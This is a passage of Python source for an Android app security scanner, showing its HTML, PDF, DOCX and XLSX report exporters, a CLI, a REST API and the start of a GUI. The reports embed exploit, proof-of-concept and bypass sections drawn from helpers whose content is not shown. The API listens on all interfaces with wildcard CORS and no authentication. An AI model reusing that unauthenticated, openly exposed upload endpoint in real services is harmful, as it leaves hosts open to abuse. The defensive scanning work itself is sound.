    for fw,ctrl in [("PCI-DSS v4.0","6.2.4, 6.5.1-10"),("OWASP MASVS v2","L1 + L2"),("GDPR Art. 32","Art. 25, 32"),("HIPAA \u00a7164.312","(a)(1), (e)(1)"),("NIST 800-53 r5","SC-8, SI-10, AC-3")]:
        st = "sf" if findings else "sp"
        h.append("<tr><td><strong>{}</strong></td><td>{}</td><td class='{}'>{}</td><td>{}</td></tr>".format(fw,ctrl,st,"NON-COMPLIANT" if findings else "COMPLIANT","{} finding(s)".format(len(findings)) if findings else "None"))
    h.append("</tbody></table></section>")

    # === 5. COMPONENTS & PERMISSIONS ===
    h.append("<section id='s5'><h2>5. Android Components &amp; Permissions</h2>")
    h.append("<p style='margin-bottom:10px;color:#8b949e'>Package: <code style='background:#161b22;color:#79c0ff;padding:2px 6px;border-radius:3px'>{}</code> | Min SDK: {} | Target SDK: {} | Components: {}</p>".format(esc(pkg),comps.get("min_sdk","N/A"),comps.get("target_sdk","N/A"),ncomp))
    if ncomp > 0:
        h.append("<table class='ct'><thead><tr><th>Type</th><th>Component</th></tr></thead><tbody>")
        for a in comps["activities"]: h.append("<tr><td>Activity</td><td>{}</td></tr>".format(esc(a)))
        for s in comps["services"]: h.append("<tr><td>Service</td><td>{}</td></tr>".format(esc(s)))
        for r in comps["receivers"]: h.append("<tr><td>Receiver</td><td>{}</td></tr>".format(esc(r)))
        for p in comps["providers"]: h.append("<tr><td>Provider</td><td>{}</td></tr>".format(esc(p)))
        h.append("</tbody></table>")
    if comps["permissions"]:
        h.append("<h3 style='color:#58a6ff;font-size:14px;margin:20px 0 10px'>Permissions ({} requested)</h3>".format(len(comps["permissions"])))
        h.append("<table class='ct'><thead><tr><th>Permission</th><th>Classification</th></tr></thead><tbody>")
        for p in comps["permissions"]:
            dang = any(d in p for d in ["CAMERA","CONTACTS","LOCATION","PHONE","SMS","STORAGE","RECORD_AUDIO","CALL_LOG"])
            h.append("<tr><td>{}</td><td class='{}'>{}</td></tr>".format(esc(p),"sf" if dang else "sp","DANGEROUS" if dang else "NORMAL"))
        h.append("</tbody></table>")
    h.append("</section>")

    # === 6. DETAILED FINDINGS ===
    h.append("<section id='s6'>")
    h.append("<div style='display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid #30363d'>")
    h.append("<h2 style='border:none;padding:0;margin:0'>6. Detailed Findings</h2>")
    h.append("<div style='background:linear-gradient(135deg,#58a6ff20,#388bfd20);color:#58a6ff;font-size:13px;font-weight:700;padding:6px 16px;border-radius:20px;border:1px solid #58a6ff30'>{} Issues Found</div></div>".format(len(findings)))

    # Summary table
    h.append("<div style='margin-bottom:24px;background:#161b22;border-radius:10px;border:1px solid #30363d;overflow:hidden'><table style='width:100%;border-collapse:collapse'>")
    h.append("<thead><tr style='background:#0d1117'><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>#</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Severity</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Title</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>CWE</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>CVSS</th><th style='padding:10px 14px;color:#8b949e;font-size:10px;text-transform:uppercase;text-align:left;border-bottom:1px solid #30363d'>Location</th></tr></thead><tbody>")
    for i,f in enumerate(findings):
        cl = scol.get(f.severity,"#388bfd")
        sf = f.file.split("/")[-1] if "/" in f.file else f.file
        h.append("<tr style='cursor:pointer;border-bottom:1px solid #21262d' onclick=\"document.getElementById('f{}').scrollIntoView({{behavior:'smooth'}})\"><td style='padding:9px 14px;font-size:12px'>{}</td><td style='padding:9px 14px;font-size:12px'><span style='display:inline-block;width:8px;height:8px;border-radius:50%;background:{};margin-right:6px'></span>{}</td><td style='padding:9px 14px;font-size:12px;font-weight:600;color:#c9d1d9'>{}</td><td style='padding:9px 14px;font-size:12px'><code style='background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:11px'>{}</code></td><td style='padding:9px 14px;font-size:12px;color:{};font-weight:700'>{}</td><td style='padding:9px 14px;font-size:12px'><code style='background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:11px'>{}:{}</code></td></tr>".format(i+1,i+1,cl,f.severity,esc(f.title),esc(f.cwe),cl,f.cvss,esc(sf),f.line))
    h.append("</tbody></table></div>")

    # Detailed finding cards
    for i,f in enumerate(findings):
        cl = scol.get(f.severity,"#388bfd")
        sicon = {"CRITICAL":"\u2622","HIGH":"\u26a0","MEDIUM":"\u25b2","LOW":"\u25cf","INFO":"\u2139"}.get(f.severity,"\u2139")
        cvpct = min(100, f.cvss*10) if isinstance(f.cvss,(int,float)) else 0
        ex = _find_exploit(f)
        bp = _find_bypass(f)
        imp = impacts.get(f.severity,"")

        h.append("<div class='fc' id='f{}'>".format(i+1))
        h.append("<div class='fs' style='background:{}'></div>".format(cl))
        # Header
        h.append("<div class='fh'><div class='fhl'>")
        h.append("<span class='fi' style='background:{}20;color:{}'>{}</span>".format(cl,cl,sicon))
        h.append("<div><div class='fid'>{} &mdash; Finding #{}</div><div class='ft2'>{}</div></div>".format(esc(f.id),i+1,esc(f.title)))
        h.append("</div><div style='display:flex;flex-direction:column;align-items:flex-end;gap:8px'>")
        h.append("<span class='fsp' style='background:{}22;color:{};border:1px solid {}55'>{}</span>".format(cl,cl,cl,f.severity))
        if isinstance(f.cvss,(int,float)) and f.cvss>0:
            h.append("<div class='fcv'><div class='fcvv' style='color:{}'>{}</div><div class='fcvb'><div class='fcvf' style='width:{:.0f}%;background:{}'></div></div><div class='fcvl'>CVSS 3.1</div></div>".format(cl,f.cvss,cvpct,cl))
        h.append("</div></div>")
        # Metadata ribbon
        h.append("<div class='fmr'>")
        h.append("<div class='fmc'><span class='fmcl'>CWE</span><span class='fmcv'>{}</span></div>".format(esc(f.cwe)))
        h.append("<div class='fmc'><span class='fmcl'>OWASP</span><span class='fmcv'>{}</span></div>".format(esc(f.owasp)))
        h.append("<div class='fmc'><span class='fmcl'>Location</span><span class='fmcv fmcm'>{}:{}</span></div>".format(esc(f.file),f.line))
        h.append("</div>")
        # Impact
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#ff7b72'>&#9888;</span><span class='fpin'>Security Impact Assessment</span></div>")
        h.append("<div class='fpc fpi2'>{}</div></div>".format(esc(imp)))
        # Evidence
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#79c0ff'>&#128270;</span><span class='fpin'>Vulnerable Code Evidence</span></div>")
        h.append("<div style='display:flex;justify-content:space-between;font-size:11px;color:#8b949e;margin-bottom:8px;padding:6px 12px;background:#0d1117;border-radius:6px;border:1px solid #21262d'><span>{}</span><span style='color:#e3b341;font-weight:600'>Line {}</span></div>".format(esc(f.file),f.line))
        h.append("<pre class='fpcd'><code>{}</code></pre></div>".format(esc(f.evidence)))
        # Exploit
        if ex:
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#f0883e'>&#9760;</span><span class='fpin'>Exploitation Methodology</span></div>")
            h.append("<p style='color:#8b949e;font-size:12px;margin-bottom:8px'>Tools: {}</p>".format(esc(ex["tool"])))
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(ex["steps"])))
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#a371f7'>&#128187;</span><span class='fpin'>Proof of Concept</span></div>")
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(ex["poc"])))
        # Bypass
        if bp:
            h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#d29922'>&#128275;</span><span class='fpin'>Bypass Technique: {}</span></div>".format(esc(bp["name"])))
            h.append("<pre class='fpcd fpe'><code>{}</code></pre></div>".format(esc(bp["methods"])))
        # Remediation
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#3fb950'>&#9989;</span><span class='fpin'>Remediation Guidance</span></div>")
        h.append("<div class='fpc fpf'>{}</div></div>".format(esc(f.fix)))
        # References
        h.append("<div class='fp'><div class='fpi'><span style='font-size:18px;color:#58a6ff'>&#128279;</span><span class='fpin'>References</span></div>")
        cwe_num = f.cwe.split("-")[1] if "-" in f.cwe else ""
        h.append("<div style='font-size:12px;color:#8b949e;line-height:2'>")
        h.append("&bull; {}: <a href='https://cwe.mitre.org/data/definitions/{}.html' style='color:#79c0ff'>https://cwe.mitre.org/data/definitions/{}.html</a><br>".format(esc(f.cwe),cwe_num,cwe_num))
        h.append("&bull; OWASP Mobile Top 10: <a href='https://owasp.org/www-project-mobile-top-10/' style='color:#79c0ff'>https://owasp.org/www-project-mobile-top-10/</a><br>")
        h.append("&bull; OWASP MASTG: <a href='https://mas.owasp.org/MASTG/' style='color:#79c0ff'>https://mas.owasp.org/MASTG/</a><br>")
        h.append("&bull; CVSS Calculator: <a href='https://www.first.org/cvss/calculator/3.1' style='color:#79c0ff'>https://www.first.org/cvss/calculator/3.1</a>")
        h.append("</div></div>")
        h.append("</div>")  # end fc
    h.append("</section>")

    # === 7. DISCLAIMER ===
    h.append("<section id='s7'><h2>7. Disclaimer &amp; Limitations</h2><div class='disc'>")
    h.append("<p>This report was generated by automated static analysis and may contain false positives. Manual verification is recommended for all findings before remediation. Dynamic analysis, runtime testing, and penetration testing should supplement this assessment.</p>")
    h.append("<p style='margin-top:10px'><strong>Limitations:</strong> Static analysis cannot detect all vulnerability classes, particularly those requiring runtime context, server-side validation, or complex data flow analysis. Business logic vulnerabilities, authentication bypass via server-side flaws, and timing attacks are outside scope.</p>")
    h.append("</div></section>")

    h.append("<footer><p>Generated by <b>{} v{}</b> | Report ID: {} | {}</p>".format(APP_NAME,VERSION,rid,now))
    h.append("<p>CONFIDENTIAL &mdash; This document contains proprietary security assessment data. Unauthorized distribution is prohibited.</p></footer>")
    h.append("</body></html>")
    return "\n".join(h)

def export_html(findings, apk, out, files=None):
    Path(out).write_text(_build_html_report(findings, apk, files), encoding="utf-8")

def export_pdf(findings, apk, out, files=None):
    sc = _sev_counts(findings)
    comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1)
    rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def esc(s): return str(s).replace("\\","\\\\").replace("(","\\(").replace(")","\\)")
    def pstream(lines):
        return "\n".join("BT /F1 {} Tf {} {} Td ({}) Tj ET".format(sz,x,y,esc(t)) for t,x,y,sz in lines)
    pages = []
    pg = [("ANDROID APPLICATION SECURITY ASSESSMENT REPORT",50,740,15),
          ("Application: "+apk,50,710,11),
          ("Date: "+now+"  |  Tool: "+APP_NAME+" v"+VERSION+"  |  Analyst: "+AUTHOR,50,692,9),
          ("",50,670,8),("EXECUTIVE SUMMARY",50,655,13),
          ("Risk Score: {:.1f}/10.0 ({})".format(avg,rl),50,635,11),
          ("Total: {}  Critical: {}  High: {}  Medium: {}  Low: {}  Info: {}".format(
              len(findings),sc["CRITICAL"],sc["HIGH"],sc["MEDIUM"],sc["LOW"],sc["INFO"]),50,617,9),
          ("",50,597,8),("ANDROID COMPONENTS",50,580,13),
          ("Package: "+comps.get("package","N/A"),50,562,9),
          ("Activities: {}  Services: {}  Receivers: {}  Providers: {}".format(
              len(comps["activities"]),len(comps["services"]),len(comps["receivers"]),len(comps["providers"])),50,546,9),
          ("Permissions: {}".format(len(comps["permissions"])),50,530,9)]
    y = 510
    for p in comps["permissions"][:20]:
        pg.append(("  - "+p.split(".")[-1],60,y,7)); y -= 11
    pages.append(pg)
    for i in range(0,len(findings),20):
        pg = [("SECURITY FINDINGS (Page {})".format(i//20+1),50,760,13)]
        y = 738
        for f in findings[i:i+20]:
            pg.append(("[{}] {} - {} (CVSS:{})".format(f.severity,f.id,f.title,f.cvss),50,y,8)); y-=11
            fn = f.file.split("/")[-1] if "/" in f.file else f.file
            pg.append(("  {}:{}  {}  Fix: {}".format(fn,f.line,f.cwe,f.fix[:55]),60,y,7)); y-=13
            if y < 50: break
        pages.append(pg)
    objs = ["<< /Type /Catalog /Pages 2 0 R >>", ""]
    fid = 3; objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>")
    pids = []
    for pl in pages:
        s = pstream(pl)
        sid = len(objs)+1; objs.append("<< /Length {} >>\nstream\n{}\nendstream".format(len(s.encode("latin-1","replace")),s))
        pid = len(objs)+1; objs.append("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {} 0 R /Resources << /Font << /F1 {} 0 R >> >> >>".format(sid,fid))
        pids.append(pid)
    objs[1] = "<< /Type /Pages /Kids [{}] /Count {} >>".format(" ".join("{} 0 R".format(p) for p in pids),len(pids))
    pdf = "%PDF-1.4\n"; offs = []
    for i,o in enumerate(objs): offs.append(len(pdf)); pdf += "{} 0 obj\n{}\nendobj\n".format(i+1,o)
    xo = len(pdf); pdf += "xref\n0 {}\n0000000000 65535 f \n".format(len(objs)+1)
    for o in offs: pdf += "{:010d} 00000 n \n".format(o)
    pdf += "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n".format(len(objs)+1,xo)
    Path(out).write_bytes(pdf.encode("latin-1","replace"))

def export_docx(findings, apk, out, files=None):
    sc = _sev_counts(findings); comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1); rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def xe(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    def wp(t,b=False,sz=24,c="000000"):
        rp = ("<w:b/>" if b else "")+'<w:sz w:val="{}"/><w:color w:val="{}"/>'.format(sz,c)
        return '<w:p><w:r><w:rPr>{}</w:rPr><w:t xml:space="preserve">{}</w:t></w:r></w:p>'.format(rp,xe(t))
    def wtr(cells,b=False):
        return "<w:tr>"+"".join('<w:tc><w:p><w:r><w:rPr>{}</w:rPr><w:t xml:space="preserve">{}</w:t></w:r></w:p></w:tc>'.format("<w:b/>" if b else "",xe(c)) for c in cells)+"</w:tr>"
    body = wp("ANDROID APPLICATION SECURITY ASSESSMENT REPORT",True,36,"1a237e")+wp("")
    body += wp("Application: "+apk,True,28)+wp("Date: {} | Tool: {} v{} | Analyst: {}".format(now,APP_NAME,VERSION,AUTHOR),False,22,"666666")+wp("")
    body += wp("1. EXECUTIVE SUMMARY",True,30,"1a237e")+wp("")
    body += wp("Risk Score: {:.1f}/10.0 ({})".format(avg,rl),True,26)
    body += wp("Total: {} | Critical: {} | High: {} | Medium: {} | Low: {} | Info: {}".format(len(findings),sc["CRITICAL"],sc["HIGH"],sc["MEDIUM"],sc["LOW"],sc["INFO"]))
    body += wp("")+wp("2. ANDROID COMPONENTS",True,30,"1a237e")+wp("")
    body += wp("Package: "+comps.get("package","N/A"))
    body += wp("Activities: {} | Services: {} | Receivers: {} | Providers: {}".format(len(comps["activities"]),len(comps["services"]),len(comps["receivers"]),len(comps["providers"])))
    body += wp("")+wp("3. PERMISSIONS ({})".format(len(comps["permissions"])),True,30,"1a237e")+wp("")
    for pm in comps["permissions"]:
        dang = any(d in pm for d in ["CAMERA","CONTACTS","LOCATION","PHONE","SMS","STORAGE","RECORD_AUDIO"])
        body += wp("  "+pm+(" [DANGEROUS]" if dang else ""),False,20,"cc0000" if dang else "333333")
    body += wp("")+wp("4. SECURITY FINDINGS",True,30,"1a237e")+wp("")
    tbl = '<w:tbl><w:tblPr><w:tblBorders><w:top w:val="single" w:sz="4"/><w:left w:val="single" w:sz="4"/><w:bottom w:val="single" w:sz="4"/><w:right w:val="single" w:sz="4"/><w:insideH w:val="single" w:sz="4"/><w:insideV w:val="single" w:sz="4"/></w:tblBorders></w:tblPr>'
    tbl += wtr(["ID","Severity","Title","CWE","OWASP","CVSS","Location","Description","Evidence","Fix"],True)
    for f in findings: tbl += wtr([f.id,f.severity,f.title,f.cwe,f.owasp,str(f.cvss),"{}:{}".format(f.file,f.line),f.desc,f.evidence[:120],f.fix])
    body += tbl+"</w:tbl>"
    body += wp("")+wp("5. METHODOLOGY",True,30,"1a237e")+wp("")
    body += wp("Analysis: {} v{} with {} security rules + taint analysis.".format(APP_NAME,VERSION,len(RULES)))
    doc = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document {}><w:body>{}</w:body></w:document>'.format(ns,body)
    ct = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
    rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
    wrels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'
    with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',ct); zf.writestr('_rels/.rels',rels)
        zf.writestr('word/_rels/document.xml.rels',wrels); zf.writestr('word/document.xml',doc)

def export_xlsx(findings, apk, out, files=None):
    sc = _sev_counts(findings); comps = _extract_android_components(files or {})
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def xe(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    def cell(c,r,v,s=0):
        ref = "{}{}".format(chr(65+c) if c<26 else "A"+chr(65+c-26),r)
        if isinstance(v,(int,float)): return '<c r="{}" s="{}"><v>{}</v></c>'.format(ref,s,v)
        return '<c r="{}" s="{}" t="inlineStr"><is><t>{}</t></is></c>'.format(ref,s,xe(str(v)[:200]))
    hdrs = ["ID","Severity","Title","CWE","OWASP","CVSS","File","Line","Description","Evidence","Fix"]
    rows = "<row r='1'>"+"".join(cell(i,1,h,1) for i,h in enumerate(hdrs))+"</row>"
    for ri,f in enumerate(findings):
        vals = [f.id,f.severity,f.title,f.cwe,f.owasp,f.cvss,f.file,f.line,f.desc,f.evidence[:200],f.fix]
        rows += "<row r='{}'>{}</row>".format(ri+2,"".join(cell(ci,ri+2,v) for ci,v in enumerate(vals)))
    s1 = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>{}</sheetData></worksheet>'.format(rows)
    sr = ""
    sd = [("Application",apk),("Date",now),("Tool",APP_NAME+" v"+VERSION),("Total",len(findings)),
          ("Critical",sc["CRITICAL"]),("High",sc["HIGH"]),("Medium",sc["MEDIUM"]),("Low",sc["LOW"]),("Info",sc["INFO"]),
          ("Package",comps.get("package","")),("Activities",len(comps["activities"])),("Services",len(comps["services"])),
          ("Receivers",len(comps["receivers"])),("Providers",len(comps["providers"])),("Permissions",len(comps["permissions"]))]
    for ri,(k,v) in enumerate(sd): sr += "<row r='{}'>{}{}</row>".format(ri+1,cell(0,ri+1,k,1),cell(1,ri+1,v))
    s2 = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>{}</sheetData></worksheet>'.format(sr)
    ct = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/></Types>'
    rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
    wbr = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>'
    wb = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Findings" sheetId="1" r:id="rId1"/><sheet name="Summary" sheetId="2" r:id="rId2"/></sheets></workbook>'
    sty = '<?xml version="1.0"?><styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><fonts count="2"><font><sz val="11"/><name val="Calibri"/></font><font><b/><sz val="11"/><name val="Calibri"/></font></fonts><fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills><borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs><cellXfs count="2"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/><xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1"/></cellXfs></styleSheet>'
    with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',ct); zf.writestr('_rels/.rels',rels)
        zf.writestr('xl/_rels/workbook.xml.rels',wbr); zf.writestr('xl/workbook.xml',wb)
        zf.writestr('xl/styles.xml',sty); zf.writestr('xl/worksheets/sheet1.xml',s1); zf.writestr('xl/worksheets/sheet2.xml',s2)

# ============================================================
#  CLI
# ============================================================
def cli_scan(args):
    apk = args.scan
    if not os.path.isfile(apk):
        print("[ERROR] Not found:", apk); return 1
    print("[{}] v{} - Headless Scan".format(APP_NAME, VERSION))
    print("[*] Target:", os.path.basename(apk))
    print("[*] Extracting...")
    files, _ = extract_apk(apk)
    print("[+] {} files extracted".format(len(files)))
    print("[*] Scanning {} rules + taint analysis...".format(len(RULES)))
    t0 = time.time()
    findings = scan_files(files)
    elapsed = time.time() - t0
    sc = _sev_counts(findings)
    taint_count = sum(1 for f in findings if f.id.startswith("DA-TAINT"))
    print("[+] {} findings ({} taint flows) in {:.1f}s".format(len(findings), taint_count, elapsed))
    print("[+] C:{} H:{} M:{} L:{} I:{}".format(sc["CRITICAL"], sc["HIGH"], sc["MEDIUM"], sc["LOW"], sc["INFO"]))
    # Save session
    sp = save_session(os.path.basename(apk), files, findings)
    print("[+] Session saved:", sp)
    # Export
    fmt = getattr(args, "format", "json") or "json"
    out = args.output or "{}_{}.{}".format(APP_NAME, os.path.basename(apk), fmt if fmt != "sarif" else "sarif.json")
    {"html": export_html, "csv": export_csv_report, "sarif": export_sarif}.get(fmt, export_json)(
        findings, os.path.basename(apk), out)
    print("[+] Report:", os.path.abspath(out))
    ch = sc["CRITICAL"] + sc["HIGH"]
    if ch > 0:
        print("[!] FAIL - {} critical/high".format(ch)); return 2
    print("[+] PASS"); return 0

# ============================================================
#  REST API  (unchanged)
# ============================================================
class ApiHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def do_GET(self):
        if self.path == "/api/health":
            self._json(200, {"status": "ok", "version": VERSION})
        elif self.path == "/api/rules":
            self._json(200, [{"id": r["id"], "name": r["name"], "sev": r["sev"]} for r in RULES])
        else:
            self._json(404, {"error": "Not found"})
    def do_POST(self):
        if self.path == "/api/scan":
            try:
                l = int(self.headers.get("Content-Length", 0))
                data = self.rfile.read(l)
                tmp = tempfile.NamedTemporaryFile(suffix=".apk", delete=False)
                tmp.write(data); tmp.close()
                files, _ = extract_apk(tmp.name)
                findings = scan_files(files)
                os.unlink(tmp.name)
                self._json(200, {"total": len(findings), "findings": [f.to_dict() for f in findings]})
            except Exception as e:
                self._json(500, {"error": str(e)})
        else:
            self._json(404, {"error": "Not found"})

def start_server(port=8089):
    print("[{}] v{} - REST API".format(APP_NAME, VERSION))
    s = HTTPServer(("0.0.0.0", port), ApiHandler)
    print("[+] http://localhost:{}".format(port))
    print("    GET /api/health | GET /api/rules | POST /api/scan")
    try: s.serve_forever()
    except KeyboardInterrupt: print("\n[*] Stopped")

# ============================================================
#  GUI  (Android Application Security Scanner Interface)
# ============================================================
def launch_gui():
    try:
        import tkinter as tk
        from tkinter import ttk, filedialog, messagebox, scrolledtext
    except ImportError:
        print("[ERROR] tkinter not available."); sys.exit(1)

    # ── Color Palette ──
    BG      = "#0f1318"
    BG2     = "#161c24"
    BG3     = "#1e2730"
    BG_CARD = "#1a2233"
    BORDER  = "#2a3444"
    FG      = "#e0e6ed"
    FG2     = "#8899aa"
    FG3     = "#556677"
    ACC     = "#4da6ff"
    ACC2    = "#1a73e8"
    RED     = "#ff4d6a"
    ORANGE  = "#ff8c42"
    YELLOW  = "#ffc857"
    GREEN   = "#42d392"
    PURPLE  = "#b388ff"
    SEVC    = {"CRITICAL": RED, "HIGH": ORANGE, "MEDIUM": YELLOW, "LOW": ACC, "INFO": FG2}
    FONT    = "Segoe UI"
    MONO    = "Consolas"

    state = {"files": OrderedDict(), "findings": [], "apk": ""}

    root = tk.Tk()
    root.title("{} v{}  \u2014  Android Application Security Scanner".format(APP_NAME, VERSION))
    root.geometry("1600x1000")
    root.minsize(1200, 750)
    root.configure(bg=BG)

    # ── ttk Style ──
    style = ttk.Style()
    style.theme_use("clam")
    style.configure(".", background=BG, foreground=FG, fieldbackground=BG2, borderwidth=0)
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=(FONT, 10))
    style.configure("TButton", background=ACC2, foreground="#ffffff", font=(FONT, 10, "bold"),
                    padding=(16, 7), borderwidth=0)
    style.map("TButton", background=[("active", ACC), ("pressed", "#1557b0")])
    style.configure("Secondary.TButton", background=BG3, foreground=FG, font=(FONT, 10),
                    padding=(14, 7), borderwidth=0)
    style.map("Secondary.TButton", background=[("active", BORDER)])
    style.configure("TNotebook", background=BG, borderwidth=0, tabmargins=[0, 0, 0, 0])
    style.configure("TNotebook.Tab", background=BG2, foreground=FG2,
                    font=(FONT, 10, "bold"), padding=[20, 8], borderwidth=0)
    style.map("TNotebook.Tab", background=[("selected", BG)], foreground=[("selected", ACC)])
    style.configure("Treeview", background=BG2, foreground=FG, fieldbackground=BG2,
                    rowheight=28, font=(FONT, 10), borderwidth=0)
    style.configure("Treeview.Heading", background=BG3, foreground=ACC,
                    font=(FONT, 10, "bold"), borderwidth=0, relief="flat")
    style.map("Treeview", background=[("selected", "#1a3a5c")])
    style.configure("TProgressbar", background=ACC, troughcolor=BG3, borderwidth=0, thickness=6)
    style.configure("TSeparator", background=BORDER)
    style.configure("TPanedwindow", background=BORDER)

    # ── Generic scroll helper for all canvas-scrolled tabs ──
    # ── Scrollable canvas registry and global scroll handler ──
    _canvas_map = {}  # tab_index -> canvas

    def _register_scrollable(tab_idx, canvas, inner):
        """Register a canvas as scrollable for a notebook tab."""
        _canvas_map[tab_idx] = canvas
        def _on_configure(e):
            canvas.configure(scrollregion=canvas.bbox("all"))
        inner.bind("<Configure>", _on_configure)

    def _global_scroll(event):
        """Single global handler: scroll whichever canvas tab is active."""
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(int(-1 * (event.delta / 120)), "units")
        except:
            pass

    def _global_scroll_up(event):
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(-3, "units")
        except:
            pass

    def _global_scroll_down(event):
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(3, "units")
        except:
            pass

    # ── Helper: create a card frame ──
    def make_card(parent, **kw):
        f = tk.Frame(parent, bg=BG_CARD, highlightbackground=BORDER,
                     highlightthickness=1, padx=kw.get("px", 16), pady=kw.get("py", 12))
        return f

    # ── Header Bar ──
    header = tk.Frame(root, bg=BG2, height=56)
    header.pack(fill="x")
    header.pack_propagate(False)
    # Logo / title
    tk.Label(header, text="\U0001f40d", font=(FONT, 20), bg=BG2, fg=ACC).pack(side="left", padx=(16, 6))
    tk.Label(header, text=APP_NAME, font=(FONT, 16, "bold"), bg=BG2, fg="#ffffff").pack(side="left")
